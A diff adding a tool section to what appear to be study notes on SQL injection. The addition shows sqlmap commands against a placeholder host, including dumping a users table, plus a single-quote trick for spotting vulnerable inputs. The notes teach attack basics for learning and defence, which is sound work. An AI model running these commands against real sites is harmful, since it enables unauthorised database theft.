@@ -38,3 +38,22 @@ From a defender's side, the fix is straightforward in principle - use parameteri
 - In-band SQLi: attacker sees results directly in the app (most common)
 - Blind SQLi: no direct output, attacker guesses data through true/false responses
 - WAF (Web Application Firewall): sits in front of a web app and filters malicious requests
+
+## One Tip / Tool
+
+Tool: `sqlmap` - automated SQL injection detection and exploitation tool
+
+```bash
+# test a URL parameter for SQLi
+sqlmap -u "http://target.com/page?id=1"
+
+# dump the entire database
+sqlmap -u "http://target.com/page?id=1" --dbs
+
+# dump a specific table
+sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
+```
+
+Only run against targets you own or have written permission to test.
+
+Detection tip: add a single quote `'` to any input field or URL parameter. If the app throws a database error like `SQL syntax error` or behaves unexpectedly, it's likely vulnerable to SQLi.
